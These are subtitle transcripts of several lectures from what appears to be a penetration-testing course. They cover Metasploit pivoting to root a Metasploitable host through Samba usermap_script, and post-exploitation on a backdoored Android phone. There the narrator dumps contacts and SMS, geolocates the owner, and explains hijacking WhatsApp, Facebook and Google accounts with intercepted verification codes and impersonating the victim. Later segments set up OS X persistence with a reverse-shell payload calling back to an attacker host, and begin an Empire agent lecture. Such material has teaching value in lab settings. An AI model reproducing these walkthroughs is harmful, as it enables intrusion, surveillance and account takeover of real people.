So to do that, we're going to use a module called 'Autoroute'.

14

00:01:08,480  -->  00:01:15,340
And let me show you first how, if I try to run exploit on the target computer, on the Metasploitable computer,

15

00:01:15,340  -->  00:01:18,220
it's not gonna work because it's not visible to me.

16

00:01:19,020  -->  00:01:21,720
So, I'm going to do a 'sessions list'

17

00:01:22,040  -->  00:01:26,400
and you'll see that I already have a connection with the Windows computer here so I've already hacked it

18

00:01:27,020  -->  00:01:28,760
and I'm going to use

19

00:01:30,120  -->  00:01:36,860
'exploit/multi/samba' and 'usermap_script'.

20

00:01:36,960  -->  00:01:40,560
Now we already used this exploit against 
the Metasploitable before,

21

00:01:40,560  -->  00:01:43,620
but it was on the same network, so it was visible to us.

22

00:01:43,680  -->  00:01:48,500
What we're doing now is trying to attack a device that is not visible to us

23

00:01:49,020  -->  00:01:50,760
and then I'm going to do 'show options'.

24

00:01:53,240  -->  00:02:01,040
I'm gonna set my 'RHOST' to '10.20.15.4' because that's the IP of the Metasploitable device,

25

00:02:01,680  -->  00:02:03,440
then I'm gonna do 'show payloads'.

26

00:02:07,020  -->  00:02:10,700
And I'm going to use this payload right here.

27

00:02:11,900  -->  00:02:16,560
So, I'm gonna do 'set PAYLOAD' to this,

28

00:02:17,140  -->  00:02:18,960
'show options',

29

00:02:20,060  -->  00:02:23,000
everything set up properly, so I'm gonna do 'exploit'.

30

00:02:26,700  -->  00:02:32,860
And you'll see that this exploit will timeout because if we go back to the diagram here,

31

00:02:33,240  -->  00:02:35,580
this device cannot see this device,

32

00:02:35,960  -->  00:02:40,760
so it's trying to run an 'exploit' on this device, even though this device has that  vu-- vulnerability,

33

00:02:41,100  -->  00:02:43,060
but I won't be able to use it

34

00:02:43,320  -->  00:02:45,760
because I can't see that device.

35

00:02:49,640  -->  00:02:54,060
And as you can see now, if the 'Exploit failed, ConnectionTimeout',

36

00:02:54,060  -->  00:02:56,260
you just couldn't connect it to the target computer.

37

00:02:56,780  -->  00:03:01,000
So what I'm going to do now, I'm gonna interact with my Meterpreter on ID 1,

38

00:03:01,000  -->  00:03:03,400
so 'sessions -i 1',

39

00:03:04,060  -->  00:03:05,540
so I'm in my Meterpreter.

40

00:03:05,800  -->  00:03:10,020
I'm gonna run 'ifconfig' first to see what my network looked like

41

00:03:10,020  -->  00:03:12,980
or the networks that the target computer is connected to.

42

00:03:16,460  -->  00:03:19,820
So, we can see all the interfaces connected to the target computer

43

00:03:20,040  -->  00:03:23,020
and I'm going to look for interfaces with IP addresses.

44

00:03:23,280  -->  00:03:26,400
So, we have this interface number 4, has an IP address

45

00:03:26,840  -->  00:03:32,600
and we can see that this IP address is on our network, so it's really not very useful,

46

00:03:32,600  -->  00:03:37,040
it's already on our network, we're on the '10.20.14' anyway, on that subnet.

47

00:03:37,420  -->  00:03:39,780
So this one is not very useful for me.

48

00:03:40,100  -->  00:03:42,440
Another one that I can see is this one,

49

00:03:42,760  -->  00:03:46,740
which is connected to '10.20.15.5'.

50

00:03:47,000  -->  00:03:52,440
So it's on a different subnet right here, which I cannot see from my Kali Linux device,

51

00:03:52,980  -->  00:03:58,220
so I'm going to try to set up a route between this subnet and my current subnet.

52

00:03:59,200  -->  00:04:00,580
So I'm gonna copy this

53

00:04:01,120  -->  00:04:05,920
and then I'm going to background my current session, so I'm back into Metasploit

54

00:04:06,540  -->  00:04:07,920
and I'll clear this.

55

00:04:08,420  -->  00:04:10,040
Then I'm going to use,

56

00:04:12,860  -->  00:04:15,800
'post/manage',

57

00:04:18,040  -->  00:04:22,320
'windows/manage/autorout'.

58

00:04:23,660  -->  00:04:28,860
Now by the way at any stage of this, if you wanted to see all the managed modules for example,

59

00:04:28,860  -->  00:04:31,320
you can just leave it at this and double-tap

60

00:04:31,920  -->  00:04:35,160
and you'll see all the 'post/windows/manage/' modules

61

00:04:35,320  -->  00:04:38,640
and you can try and use them and ex-- experiment with them.

62

00:04:39,220  -->  00:04:42,460
So our one, the one that we want to use is 'autoroute'

63

00:04:43,880  -->  00:04:45,820
and I'm going to do 'show options',

64

00:04:46,240  -->  00:04:47,980
to see the options that I can set.

65

00:04:48,500  -->  00:04:52,200
And we have two options that we need to set, we need to set the SESSION

66

00:04:52,360  -->  00:04:55,000
that we have and the subnet.

67

00:04:55,840  -->  00:04:57,620
So, I'm going to 'set' the 'session' first.

68

00:04:59,340  -->  00:05:00,940
And it's session number '1'.

69

00:05:02,300  -->  00:05:06,960
And then I'm going to 'set' the 'SUBNET' to that we've seen when we did the 'ifconfig' command.

70

00:05:09,480  -->  00:05:14,040
Though it was '10.20.15' and I'm gonna put a '0' to it.

71

00:05:14,940  -->  00:05:18,020
So again, we're using the 'set', very simple commands we already learned,

72

00:05:18,260  -->  00:05:23,240
we setting the session to number 1, thats the session that we hacked for the Windows

73

00:05:23,500  -->  00:05:29,520
and the SUBNET is the subnet, which the windows is connected to and we don't have access to,

74

00:05:29,680  -->  00:05:31,680
so it's the '10.20.15.0'.

75

00:05:32,980  -->  00:05:34,700
And I'm going to do 'exploit'.

76

00:05:38,040  -->  00:05:46,500
And this will create the connection or the route between my device and the Windows device.

77

00:05:47,060  -->  00:05:51,980
So, what I'm going to do now, I'm gonna go back to the same Exploit that I tried at the start of the video

78

00:05:52,180  -->  00:05:58,240
and you'll see that the Exploit is going to work because the Windows device is visible to me now.

79

00:05:58,660  -->  00:06:05,520
So instead of using that Exploit you can use as I said, Port scanners or Discovery modules

80

00:06:05,520  -->  00:06:09,560
that come in with Metasploit or any other module that come in with Metasploit

81

00:06:09,560  -->  00:06:15,980
because my device can now see the target computer, it can see this Metasploitable device.

82

00:06:16,380  -->  00:06:21,360
Because it was not visible for me at the start, but now I have a connection to this computer

83

00:06:21,520  -->  00:06:25,080
and I set up a route between this network and my computer,

84

00:06:25,080  -->  00:06:28,120
so I can actually see the Metasploitable device now.

85

00:06:29,200  -->  00:06:32,440
So I'm going to use the same spot I used before.

86

00:06:36,820  -->  00:06:40,000
And it was 'exploit/multi/samba/usermap_script',

87

00:06:40,500  -->  00:06:41,820
just clear that.

88

00:06:42,480  -->  00:06:45,111
Now I'm going to show the options and I'm going to leave them the same

89

00:06:45,120  -->  00:06:47,200
because everything is actually set up correctly.

90

00:06:49,800  -->  00:06:51,880
So I'm just going to do 'exploit'.

91

00:06:53,240  -->  00:06:57,520
And as you can see, now Command shell was started properly

92

00:06:57,840  -->  00:07:03,000
and I actually have access to the Metasploitable device now, so I can do 'id' and I'm root.

93

00:07:03,360  -->  00:07:07,920
I can do a 'uname -a' to just confront that for you.

94

00:07:09,140  -->  00:07:13,980
And we can see that we're in the  Metasploitable device and I can run any lix-- Linux command that I want,

95

00:07:13,980  -->  00:07:16,040
so I can do 'ls'

96

00:07:17,300  -->  00:07:19,600
'pwd' and I should be in the root

97

00:07:20,120  -->  00:07:22,880
and I can do 'cd', go to 'var; for example

98

00:07:23,140  -->  00:07:28,680
and do any Li-- Linux command that I want, so I basically, have full access to the target computer

99

00:07:29,680  -->  00:07:33,980
Now again as I said, you could upload stuff and run them from the target computer,

100

00:07:34,060  -->  00:07:37,260
but it's not always a good idea to upload things to a hacked computer.

101

00:07:37,260  -->  00:07:42,360
So, setting up the routes like this and using pivoting is a much safer choice.

102

00:07:44,020  -->  00:07:48,840
And I highly recommend that you go and have a look on other Metasploitable modules

103

00:07:48,840  -->  00:07:51,400
'cause Metasploit is really, really big,

104

00:07:51,400  -->  00:07:54,932
it's hard for me to cover everything, I just covered the main basic stuff,

105

00:07:54,940  -->  00:07:58,980
but you can always just go in and have a look on other modules and try them.

106

00:07:58,980  -->  00:08:04,760
Using the modules is usually the same, we had a look on a broad array of modules,

107

00:08:04,760  -->  00:08:09,900
so it should be easy to just configure options and run these modules, the way you want.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:00,700  -->  00:00:07,780
In this lecture, I'd like to spend some time using the Meterpreter session, that we got on the Android device.

2

00:00:08,780  -->  00:00:12,940
Now because this is a Meterpreter session, you'll see interacting with it,

3

00:00:13,140  -->  00:00:19,860
is very similar to any Meterpreter session that we get, whether we get it on Windows, Linux or OS X.

4

00:00:20,240  -->  00:00:24,240
Like I said, the main usage and the main concept is very similar.

5

00:00:25,280  -->  00:00:30,660
So I'm already inside my Android machine and you can see that I got my connection from Android device

6

00:00:30,660  -->  00:00:33,620
that's at '192.168.0.37',

7

00:00:34,120  -->  00:00:36,260
so I can just do 'sysinfo' now,

8

00:00:37,460  -->  00:00:39,600
to see the information about this phone.

9

00:00:39,920  -->  00:00:43,600
And again this is the same command that we always use with Meterpreter

10

00:00:43,600  -->  00:00:47,560
to get information about the device or the computer that we hacked.

11

00:00:48,180  -->  00:00:55,560
And you can see, we get the computer and the OS, which is Android 4.4.3 which is old but it doesn't really matter

12

00:00:55,560  -->  00:00:58,980
because we're not exploiting an Exploit, we're just using a backdoor.

13

00:00:59,140  -->  00:01:03,340
So, this backdoor will work the same regardless of what Android version is your target.

14

00:01:03,880  -->  00:01:06,340
Then we can do 'Help' like we always used to do,

15

00:01:06,560  -->  00:01:09,500
to see all the commands that we can run on the system.

16

00:01:09,920  -->  00:01:10,920
And if we go up,

17

00:01:11,760  -->  00:01:18,400
you'll see all the commands here, are very similar to the commands on any computer that you hack.

18

00:01:18,620  -->  00:01:24,240
So, we can do 'cat' to 'Read the contents of a file', you can do 'cd' to 'go to a certain place'.

19

00:01:24,620  -->  00:01:30,629
You can 'download', you can list files using 'ls', you can do-- make directory,

20

00:01:30,629  -->  00:01:33,520
you can do 'pwd' to see your location,

21

00:01:33,680  -->  00:01:36,060
you can upload using the 'upload' command

22

00:01:36,260  -->  00:01:40,180
and we've seen how to use all of these commands before, on other operating systems.

23

00:01:40,500  -->  00:01:44,760
So, I'm not gonna show you how to use them now because they're literally, exactly the same.

24

00:01:45,380  -->  00:01:47,500
For example if I just do 'pwd'

25

00:01:49,200  -->  00:01:55,100
you'll see, I'll get my work in directory, which is in '/data/data/com.dotgears.flappybird/' and I'm in 'files'.

26

00:01:55,680  -->  00:01:58,420
I can navigate back by doing 'cd ..'

27

00:01:58,980  -->  00:02:02,320
and then if I do 'pwd' again, you'll see me I'm back

28

00:02:02,880  -->  00:02:05,500
and so on, so you can navigate, upload, download,

29

00:02:05,740  -->  00:02:09,700
exactly the same way that we've seen before and I don't wanna spend time on that

30

00:02:09,700  -->  00:02:11,420
because it's just gonna get boring.

31

00:02:12,500  -->  00:02:13,800
What I wanna show you though,

32

00:02:13,980  -->  00:02:19,300
the commands that are specific to Android phones, to the Android Meterpreter payload

33

00:02:19,620  -->  00:02:21,940
and these commands are right here.

34

00:02:23,020  -->  00:02:24,920
The first set of commands in here,

35

00:02:25,280  -->  00:02:31,600
these are the commands that allow you to access the components of the target android phone.

36

00:02:31,980  -->  00:02:34,271
So you can see that we can record the mic,

37

00:02:34,280  -->  00:02:39,600
so we can turn on the mic and start recording, from that phone using 'record_mic'.

38

00:02:40,140  -->  00:02:44,240
You can also see the webcam commands that we used in the teaser lecture

39

00:02:44,540  -->  00:02:48,280
and we use the 'webcam_list' to list the webcams.

40

00:02:49,820  -->  00:02:51,640
And then we did 'webcam_stream'

41

00:02:53,360  -->  00:02:56,860
and we put number '2' to access the front camera.

42

00:02:57,440  -->  00:03:00,260
Again I'm not gonna do that because we've seen this before.

43

00:03:01,120  -->  00:03:07,060
If you wanna see help about any of these modules for example, let's say, you wanted to use the 'record_mic'

44

00:03:07,060  -->  00:03:08,760
and you don't know how to use it,

45

00:03:08,960  -->  00:03:11,080
all you have to do is just type its name

46

00:03:11,540  -->  00:03:13,040
followed by '-h'.

47

00:03:13,800  -->  00:03:16,260
And that will show you a description of this module.

48

00:03:16,540  -->  00:03:20,800
So right here is telling us that this will 'Record the audio from the default microphone.'

49

00:03:20,960  -->  00:03:23,080
and then it will show you the options that you can set.

50

00:03:23,480  -->  00:03:28,480
So you can use '-d' to specify a specific 'Number of seconds to record',

51

00:03:29,040  -->  00:03:32,440
you can specify the name of the file using the '-f',

52

00:03:32,900  -->  00:03:35,380
'-h' will show you the help like we just seen

53

00:03:35,600  -->  00:03:40,940
and then you can do '-p' to 'Automatically play the captured audio', once you capture it.

54

00:03:41,260  -->  00:03:45,920
Again I'm not gonna show you that because it's very simple, all you have to do is just put 'record_mic'

55

00:03:46,080  -->  00:03:49,760
'-d 60 seconds' for example, to record for 60 seconds

56

00:03:50,060  -->  00:03:54,000
and then it will record the mic for 60 seconds and then play it for you.

57

00:03:54,680  -->  00:03:59,260
What's really interesting in my opinion is the Android commands in here

58

00:03:59,820  -->  00:04:04,500
and again you can execute any of these only by typing the name of the command,

59

00:04:05,040  -->  00:04:07,260
so you can start the specific activity.

60

00:04:07,426  -->  00:04:12,200
You can check if you are root and again all you have to do is just type in this command to do that,

61

00:04:12,580  -->  00:04:13,840
so these are very simple.

62

00:04:14,460  -->  00:04:17,420
What I wanna talk about is the 'geolocate'

63

00:04:17,940  -->  00:04:20,800
and basically, if you just type in 'geolocate'

64

00:04:21,980  -->  00:04:28,760
it'll show you information about the exact specific location of that phone using the GPS,

65

00:04:29,180  -->  00:04:31,840
so you'll know exactly where your target is.

66

00:04:32,820  -->  00:04:37,140
Now, I'm not gonna run this command as well because it will show exactly where I am now

67

00:04:37,300  -->  00:04:38,840
and I just don't wanna share that.

68

00:04:40,040  -->  00:04:43,620
Another really, really cool option is 'send_sms'

69

00:04:43,960  -->  00:04:49,400
and what's this gonna do, it's gonna send a message, an SMS from the target phone,

70

00:04:49,400  -->  00:04:52,480
so you can just send an SMS to any person you want.

71

00:04:53,160  -->  00:04:59,840
And again if you don't know how to use this, all you have to do is just type in 'send_sms -help'.

72

00:05:01,120  -->  00:05:06,920
And then you'll see the options on how to use this and you can see the 'usage' is, you do send SMS,

73

00:05:07,160  -->  00:05:12,140
'-d' followed by the phone number that you want to send this message to,

74

00:05:12,420  -->  00:05:15,160
followed by '-t' and the message.

75

00:05:16,540  -->  00:05:18,900
Now, this can be very useful in Social-Engineering

76

00:05:18,980  -->  00:05:22,900
because using that you can pretend to be the person that you just hacked

77

00:05:23,220  -->  00:05:26,060
and you're gonna be sending messages like that person.

78

00:05:26,060  -->  00:05:31,700
So let's say, for example, you hacked a person that is a friend of your target, it's not your target

79

00:05:32,100  -->  00:05:35,740
and then using this friend, you can ask them to again to install apps

80

00:05:36,160  -->  00:05:38,960
or do stuff and from that, hack into your target.

81

00:05:40,740  -->  00:05:45,220
If you don't know their phone number, easy, you have a 'dump_contacts' in here

82

00:05:45,620  -->  00:05:48,780
and I'm actually gonna run this for you so if I just do 'dump_contacts'.

83

00:05:50,840  -->  00:05:58,120
It's gonna save all the contacts that are stored in this phone and a file called 'contacts_dump.txt'.

84

00:05:58,940  -->  00:06:01,460
So if I just go to my root directory right now,

85

00:06:03,040  -->  00:06:06,420
you'll see I have that file here and if I double-click it.

86

00:06:06,820  -->  00:06:10,720
I'll see all of the contacts that are stored on that phone.

87

00:06:12,740  -->  00:06:19,520
Another really cool command that you can run on Android is the 'dump_messages' or 'dump_sms'

88

00:06:20,160  -->  00:06:25,100
and what's this gonna do is, it's gonna show you all the messages that this target person got.

89

00:06:25,600  -->  00:06:28,980
So let me show you that, so let's just do 'dump_sms'.

90

00:06:31,460  -->  00:06:37,900
And it's telling us now, the messages are stored in a file called 'sms_dump' and it ends in '338'.

91

00:06:38,640  -->  00:06:41,920
So if we look for that, we have it here,

92

00:06:42,260  -->  00:06:44,100
again if we just double click it.

93

00:06:45,940  -->  00:06:49,600
You'll see all the recent messages that I got on that phone.

94

00:06:50,580  -->  00:06:53,120
Now, what's really interesting in this,

95

00:06:53,400  -->  00:07:00,320
is that you can use this phone now, to pretty much hack into any account that that target has.

96

00:07:01,080  -->  00:07:06,720
Why because most services allow you to recover your password based on your email.

97

00:07:07,120  -->  00:07:11,360
So if you go to Facebook for example and click on your the Forgot Password,

98

00:07:11,460  -->  00:07:14,260
it will send you a code on your phone number

99

00:07:14,420  -->  00:07:17,820
and then if you enter that code, you'll be able to reset the password.

100

00:07:18,900  -->  00:07:23,320
Same goes with Google, Yahoo, Twitter and all of these websites.

101

00:07:24,260  -->  00:07:28,700
Another really cool things that you can do with this is if you actually look in here,

102

00:07:28,900  -->  00:07:31,340
I have a WhatsApp verification message.

103

00:07:32,000  -->  00:07:36,080
So you can gain access to this person's WhatsApp account or Viber

104

00:07:36,080  -->  00:07:40,320
or any kind of phone messaging app, using this as well,

105

00:07:40,460  -->  00:07:42,740
so all you have to do is get another phone,

106

00:07:42,940  -->  00:07:45,040
install WhatsApp on it for example,

107

00:07:45,140  -->  00:07:51,440
and then WhatsApp will send a verification code to the phone number that you want to log in as.

108

00:07:52,020  -->  00:07:56,500
So let's say our target was Zaid, we put Zaid's phone number on the new phone

109

00:07:57,000  -->  00:08:01,420
and then we will get a message on the phone that we just hacked in here with the code.

110

00:08:01,880  -->  00:08:05,040
And you can see in here, I'm getting the code in this message.

111

00:08:05,420  -->  00:08:10,780
So, all you have to do is just get the code which is this one in here, put it on your new phone

112

00:08:10,980  -->  00:08:15,840
and then you log in to Zaid's WhatsApp and you'll be able to read messages, send messages

113

00:08:15,900  -->  00:08:19,840
or do anything you want, you'll basically just gain access to the WhatsApp account.

114

00:08:20,460  -->  00:08:24,680
So the 'sms_dump' here is very, very, very, very useful

115

00:08:24,780  -->  00:08:31,240
because you can use it to gain access to any account, Google, Facebook, Twitter, WhatsApp and so on.

116

00:08:31,500  -->  00:08:33,840
With that, you won't have to bypass any encryption,

117

00:08:33,840  -->  00:08:35,620
you won't have to do any Brute-force,

118

00:08:35,780  -->  00:08:37,900
you basically, just reset the password

119

00:08:38,180  -->  00:08:42,340
or get the verification code and use that to gain access to your target.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:01,000  -->  00:00:07,280
In this lecture, I'm gonna show you how to maintain our Meterpreter access to an OS X machine,

2

00:00:07,560  -->  00:00:09,620
even after the system restarts.

3

00:00:10,320  -->  00:00:15,080
Now we've seen how to do this with Windows and you'll see doing it with OS X is similar.

4

00:00:15,420  -->  00:00:20,540
There is only minor changes but I'm gonna do it again just to show you how to set the payload

5

00:00:20,600  -->  00:00:25,200
and just to make you feel more comfortable with using Metasploit exploits

6

00:00:25,200  -->  00:00:27,540
and modules outside the Meterpreter.

7

00:00:29,040  -->  00:00:32,480
Now as you can see, I'm already inside my OS X machine,

8

00:00:32,800  -->  00:00:36,460
I've already get my connection, I'm already in the Meterpreter.

9

00:00:36,960  -->  00:00:40,200
So I can just do 'sysinfo' to confirm everything is working

10

00:00:41,400  -->  00:00:44,360
and as you can see, I'm inside that machine

11

00:00:44,720  -->  00:00:47,780
and what's really cool about this method that I'm showing you right now

12

00:00:48,000  -->  00:00:52,640
is that it doesn't require you to be root or to be running in high integrity.

13

00:00:52,820  -->  00:00:55,980
You can actually do this while running as the normal user.

14

00:00:56,420  -->  00:00:58,600
So if I do 'getuID' right now,

15

00:01:00,480  -->  00:01:03,920
you'll see that I'm logged in or I'm controlling the computer

16

00:01:04,180  -->  00:01:10,720
as z00z and z00z is a normal user, he's not an admin, he's not, he doesn't have extra privileges.

17

00:01:14,000  -->  00:01:17,060
So to do this we're gonna first background this session

18

00:01:19,840  -->  00:01:23,940
then I'm gonna use an exploit for OS X

19

00:01:25,460  -->  00:01:31,780
and that's a local exploit and what we want the exploit to do is it's gonna allow us to maintain the access

20

00:01:31,860  -->  00:01:33,800
so it's called 'Persistence'.

21

00:01:34,680  -->  00:01:39,620
Now like I said at any stage, if you aren't sure you can just double tab in here, for example

22

00:01:41,280  -->  00:01:46,240
and you'll see all the exploits available under 'exploit/osx/local'.

23

00:01:46,700  -->  00:01:50,720
So the one that I wanna use is the persistence one which is in here

24

00:01:53,100  -->  00:01:56,620
and I can just do 'per...' and hit 'Tab' to autocomplete.

25

00:01:58,360  -->  00:02:03,540
So we're using an exploit called 'exploit/osx/local/persistence'

26

00:02:04,880  -->  00:02:07,180
and as usual if you do 'show options',

27

00:02:08,920  -->  00:02:12,260
we'll see all the options that we can set with this exploit.

28

00:02:13,040  -->  00:02:17,320
Now the first thing that I wanna do is set the 'RUN NOW' option.

29

00:02:17,880  -->  00:02:20,560
What this does is it's gonna run the payload

30

00:02:20,560  -->  00:02:24,420
that we're gonna generate immediately after we exploit this module.

31

00:02:24,920  -->  00:02:26,480
So I'm gonna set this to 'true'

32

00:02:28,620  -->  00:02:33,800
and as you can see setting these options is exactly the same as setting any other option in Metasploit.

33

00:02:33,800  -->  00:02:37,100
You just do set, option name, option value.

34

00:02:38,180  -->  00:02:41,900
Now the next important option that we wanna set is this session

35

00:02:42,340  -->  00:02:46,800
and this is the session that you're Meterpreter is running on at the moment.

36

00:02:47,280  -->  00:02:51,320
And as you can see my Meterpreter is running here on session '1'

37

00:02:52,240  -->  00:02:53,940
or you can do sessions 'l'

38

00:02:55,460  -->  00:03:02,260
to list all available sessions and as you can see the session ID for my Meterpreter is number '1'.

39

00:03:02,900  -->  00:03:04,620
So we're gonna set that to '1' as well...

40

00:03:07,800  -->  00:03:10,880
and now all the mandatory options are done.

41

00:03:11,260  -->  00:03:16,458
We need to select a payload so that it runs as a service on the target computer

42

00:03:16,760  -->  00:03:20,180
and that service will always try to connect back to us.

43

00:03:21,020  -->  00:03:25,960
Now you can't use all payloads with this, there is only specific payloads that you can use

44

00:03:26,320  -->  00:03:30,500
and to see the payloads that you can use, we're gonna do 'show payloads'.

45

00:03:33,100  -->  00:03:35,400
Now as you can see we have a number of options

46

00:03:35,660  -->  00:03:41,940
and the one that I wanna use is this one, which will give us a reverse shell access to the target computer.

47

00:03:43,000  -->  00:03:51,540
So I'm gonna do 'set PAYLOAD' to 'osx/x86/shell_reverse_tcp'.

48

00:03:53,560  -->  00:03:55,180
Now if we do show options...

49

00:03:57,040  -->  00:04:02,240
you'll see I have more options and these extra options are related to my payload.

50

00:04:02,240  -->  00:04:05,900
So we can see the payload here and we can see we have two more options

51

00:04:05,900  -->  00:04:08,680
which is the LHOST and the LPORT

52

00:04:09,180  -->  00:04:14,040
and again we can set these exactly like any other options, so I'm gonna set my LHOST

53

00:04:15,640  -->  00:04:26,540
to the IP of my Kali machine which is '192.168.0.34' and I'm gonna set my LPORT 22222.

54

00:04:27,400  -->  00:04:32,380
Now you can use any port like I said, using something like 80 or 88 will be less suspicious

55

00:04:32,700  -->  00:04:34,440
but this will work for this lecture.

56

00:04:35,440  -->  00:04:36,900
Now I'm gonna do 'show options'

57

00:04:39,100  -->  00:04:42,720
and we're just gonna review and make sure that we set everything properly.

58

00:04:43,800  -->  00:04:47,980
So we're using an exploit called 'exploit/osx/local/persistence'

59

00:04:47,980  -->  00:04:53,000
which will-- which will inject a payload as a service in the target computer.

60

00:04:53,600  -->  00:05:00,360
We set the 'RUN NOW' to 'true' so that the payload that we inject runs immediately after we exploit this.

61

00:05:00,780  -->  00:05:05,400
We set the session to the session ID of our Meterpreter access

62

00:05:05,400  -->  00:05:08,800
that we already have right now on the target computer

63

00:05:09,140  -->  00:05:13,720
then we set the payload to 'osx/shell_reverse_tcp'.

64

00:05:14,360  -->  00:05:18,820
We set the LHOST to our IP address and we set the LPORT.

65

00:05:20,060  -->  00:05:24,400
So we're all good were ready to go and I'm gonna do exploit to run this module.

66

00:05:28,660  -->  00:05:31,380
Now as you can see, now this module guard executed

67

00:05:31,520  -->  00:05:34,700
and a very important thing that you wanna keep on the side

68

00:05:35,000  -->  00:05:39,160
is how to remove this service from the target computer

69

00:05:39,480  -->  00:05:43,140
and to do that Metasploit is already given us 3 commands to run

70

00:05:43,520  -->  00:05:45,740
and I'm just gonna copy these commands here

71

00:05:46,780  -->  00:05:51,940
and paste them in a notepad so in the future if I want to delete this all I have to do is just

72

00:05:52,260  -->  00:05:56,560
from Meterpreter drop down to a Shell and then run these commands in the Shell

73

00:05:56,560  -->  00:06:02,560
or if I'm running it from a Shell access, I can just directly run these commands on the target computer

74

00:06:02,560  -->  00:06:05,980
and then the payload will not work as a service.

75

00:06:07,240  -->  00:06:13,300
So since I set my 'RUN NOW' option to true I'm actually already connected now to my service,

76

00:06:13,300  -->  00:06:17,920
so if I do 'pwd', you'll see I'm inside that computer, so I can list.

77

00:06:18,520  -->  00:06:21,260
I can see the system info

78

00:06:23,680  -->  00:06:27,100
and I can pretty much do anything I want on that computer

79

00:06:27,160  -->  00:06:31,900
but this is not what we want, we want to be able to do this even if the computer restart.

80

00:06:31,940  -->  00:06:34,300
So I'm gonna do Ctrl+C to close this

81

00:06:35,340  -->  00:06:38,160
and I'm gonna put 'y' to abort the session.

82

00:06:38,980  -->  00:06:43,420
And I'm also gonna kill my Meterpreter session so I'm gonna do 'sessions l'

83

00:06:43,800  -->  00:06:51,580
to  lists, to see these sessions that I have and then I'm gonna do '-k1' to kill the session with ID number 1,

84

00:06:51,580  -->  00:06:53,380
which is basically this session,

85

00:06:53,960  -->  00:06:56,660
gonna hit 'Enter' and that's killed.

86

00:06:56,660  -->  00:07:01,640
So now if we do 'sessions l', you'll see that we have nothing here.

87

00:07:02,700  -->  00:07:07,600
Now I'm gonna go on the Mac OS X machine, I'm gonna restart it

88

00:07:11,560  -->  00:07:14,960
and after it restarts, we'll see if we can connect to it

89

00:07:15,600  -->  00:07:19,200
but while it's restarting, I'm going to set up my multi/handler

90

00:07:19,200  -->  00:07:23,040
because as usual when we want to receive reverse connections,

91

00:07:23,040  -->  00:07:25,860
we have to be listening for these incoming connections.

92

00:07:26,320  -->  00:07:29,480
So we've used this a lot by now and I'm gonna do this a bit quickly,

93

00:07:29,820  -->  00:07:32,420
so I'm gonna do 'use exploit/multi/handler'

94

00:07:33,400  -->  00:07:39,800
and I'm gonna set the payload to the same payload that we picked when we generated this service.

95

00:07:39,800  -->  00:07:44,780
So we picked an 'osx/x86/shell_reverse_tcp'

96

00:07:45,520  -->  00:07:48,700
so I'm gonna copy it and then do set payload

97

00:07:49,960  -->  00:07:50,980
and paste it

98

00:07:52,940  -->  00:07:56,600
then I'm gonna do 'show options' to see my options

99

00:07:56,800  -->  00:08:02,620
and we can see that the LHOST is already configured correctly what I wanna change is the LPORT

100

00:08:03,980  -->  00:08:08,780
to 2222 because that's the one we used when we generated that service.

101

00:08:09,520  -->  00:08:12,582
So we're now we're all good but I'm not gonna exploit this

102

00:08:12,582  -->  00:08:17,840
because I wanna show you some people think that this will only work when the person logs in

103

00:08:17,840  -->  00:08:24,380
but this is gonna be installed as a service and the service will always try to connect back to you.

104

00:08:24,560  -->  00:08:28,560
So I'm gonna log in now to my OS X machine, we're just pretending

105

00:08:28,560  -->  00:08:32,420
that their target just turned on their computer, they logged in

106

00:08:32,800  -->  00:08:37,540
and now they can go ahead and either now use Word or go on the internet,

107

00:08:37,540  -->  00:08:40,100
answer their emails whatever they're gonna do

108

00:08:40,340  -->  00:08:42,600
and you came in let's say an hour after that

109

00:08:42,600  -->  00:08:48,440
and you wanted to get your access to that computer, you set up your multi/handler like we did before

110

00:08:48,780  -->  00:08:56,560
and we're just gonna do 'show options' to make sure that everything is correct, we have the right payload in here.

111

00:08:57,680  -->  00:09:03,120
We have the right IP, we have the right port, we're gonna do 'exploit'

112

00:09:07,220  -->  00:09:15,380
and as you can see we got a session right here, from the target computer, from the OS X machine

113

00:09:15,800  -->  00:09:21,020
and now we have full access to that machine so again you can do 'uname -a' to confirm that

114

00:09:22,600  -->  00:09:29,480
and as you can see I'm inside that machine, I can list files I can run all Shell commands right now in that machine.

115

00:09:31,140  -->  00:09:37,300
So right now, we have Shell access to this computer this means we can run all the Shell commands

116

00:09:37,300  -->  00:09:39,620
that you can run on OS X terminal.

117

00:09:39,960  -->  00:09:47,460
This means we can read, edit, upload and download files, we can upload files like we seen before using 'curl'

118

00:09:47,460  -->  00:09:50,820
and then you can just execute them from the terminal,

119

00:09:50,820  -->  00:09:55,080
if you want it to run different backdoors or different files or just run,

120

00:09:55,080  -->  00:09:58,820
for example if you want it to run an Empire backdoor or Meterpreter backdoor.

121

00:09:59,080  -->  00:10:02,920
You can put, you pretty much have full access to the computer again now

122

00:10:03,080  -->  00:10:06,760
and this will always work and it'll always try to connect back to you

123

00:10:06,760  -->  00:10:10,580
even if the computer restarts or if the person turn off their computer.

124

00:10:11,160  -->  00:10:17,600
And again the very cool thing about this method is that it doesn't require you to be root

125

00:10:17,600  -->  00:10:23,100
or to have elevated privileges we managed to do this with the normal privileges

126

00:10:23,100  -->  00:10:26,840
that a normal user has on an OS X machine.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
==================================================================================

# Section 18: Post Exploitation - Empire


1
00:00:00,280 --> 00:00:06,370
Now in this lecture and the next few lectures, I'd like to spend some time using the Empire agents

2
00:00:06,370 --> 00:00:12,900
and see the basic usage and how to use their modules, just like the Meterpreter payload.

3
00:00:12,910 --> 00:00:19,270
The features that the Empire agents offer are huge, so you won't be able to cover all of them.

4
00:00:19,270 --> 00:00:25,570
But I'm going to try to cover the basic usage and the whole idea of how to use these modules because

5
00:00:25,570 --> 00:00:27,010
using them is similar.

6
00:00:27,010 --> 00:00:29,230
You just want to know your way around it.

7
00:00:29,650 --> 00:00:36,250
And also, just like the Meterpreter payload, using the agent is very similar.

8
00:00:36,250 --> 00:00:43,150
Whether your target is Windows Linux or OSX, there might be slight differences, but you'll be able

9
00:00:43,150 --> 00:00:47,620
to know them and know which commands you can use with which by the end of this section.

10
00:00:48,040 --> 00:00:53,800
So the basic usage in everything you're going to see in this lecture will work on all operating systems.

11
00:00:53,890 --> 00:00:59,700
At the moment I'm not interacting with any agents and I just have the client screen of Empire.

12
00:00:59,710 --> 00:01:01,670
Now to go to the agents menu.

13
00:01:01,670 --> 00:01:08,300
All we have to do is simply type agents and it will automatically list all of the agents or all of the

14
